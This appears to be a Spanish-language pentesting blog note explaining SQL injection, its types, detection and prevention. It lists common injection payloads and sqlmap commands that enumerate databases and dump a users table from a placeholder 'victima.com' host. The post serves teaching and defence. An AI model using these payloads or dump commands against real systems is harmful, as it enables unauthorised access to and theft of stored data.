---
title: "SQL Injection: Cuando las bases de datos te cuentan sus secretos"
author: "l1ttl3bugc4t"
date: "2025-06-09"
tags: [SQL Injection, Inyección, Pentesting, Seguridad Web, Red Team, Exploit]
categories: [cuaderno, Red Team & Chill, CyberChallenges]
---

**SQL Injection** (o **SQLi**) es como engañar a una base de datos para que revele sus secretos más oscuros con una simple frase maliciosa 😼📜

---

## 🧠 ¿Qué es SQL Injection?

Es una vulnerabilidad que ocurre cuando una aplicación web **inserta datos no validados directamente en una consulta SQL**.  
Esto permite que un atacante altere la lógica del query, acceda a datos sensibles o incluso ejecute comandos en el sistema operativo.

---

## 💥 Ejemplo básico

Supón que tienes una URL como esta:

```
https://tienda.com/producto.php?id=3
```

Y el backend hace algo como:

```sql
SELECT * FROM productos WHERE id = '3';
```

Un atacante podría enviar:

```
https://tienda.com/producto.php?id=3' OR '1'='1
```

Resultado:

```sql
SELECT * FROM productos WHERE id = '3' OR '1'='1';
```

¡Esto devuelve todos los productos!

---

## 🕳️ Tipos de SQL Injection

| Tipo | Descripción |
|------|-------------|
| **Inyección clásica (In-band)** | Resultado visible directamente |
| **Blind SQLi** | No hay error visible, se infiere por comportamiento |
| **Time-based** | Usa retardos (`SLEEP()`) para inferir datos |
| **Out-of-band** | Usa canales externos como DNS o HTTP para exfiltrar datos |

---

## 🔍 Cómo detectar SQLi

- Parámetros que afectan directamente consultas
- Errores SQL en pantalla (`syntax error`, `unclosed quote`)
- Comportamientos extraños en búsquedas o formularios
- Uso de comillas `'`, doble comilla `"`, o operadores `OR`, `AND`

---

## 🧪 Payloads comunes

```sql
' OR 1=1 --
" OR "1"="1" --
admin' --
1' AND SLEEP(5) --
```

---

## 🛠️ Herramientas favoritas

- `sqlmap` → escaneo y explotación automática
- `Burp Suite` → para identificar y probar manualmente
- `sqlninja`, `jSQL`, `NoSQLMap` → alternativas y especializados

---

## 🧬 Comandos útiles con sqlmap

```bash
sqlmap -u "http://victima.com/item.php?id=1" --dbs
sqlmap -u "http://victima.com/item.php?id=1" -D tienda -T usuarios --dump
sqlmap -r request.txt --level 5 --risk 3 --batch
```

---

## 🔐 Prevención

- **Usa consultas preparadas** (`prepared statements`)
- Escapa y valida entradas de usuario
- Usa ORMs que gestionen queries por ti
- No reveles errores de base de datos al cliente
- Limita privilegios de las cuentas de DB

---

## 🧵 Curiosidad extra

Algunas SQLi permiten obtener **shells reversas**, leer archivos (`LOAD_FILE`) o escribir scripts (`INTO OUTFILE`) en el servidor 😈

---

## ✨ Conclusión

Una **SQL Injection** es como hablar el idioma secreto del servidor…  
Y si no está bien entrenado, **te revela todo sin pensarlo dos veces** 😹📚

> _"Dame una comilla y moveré el mundo."_ — **l1ttl3bugc4t**

---
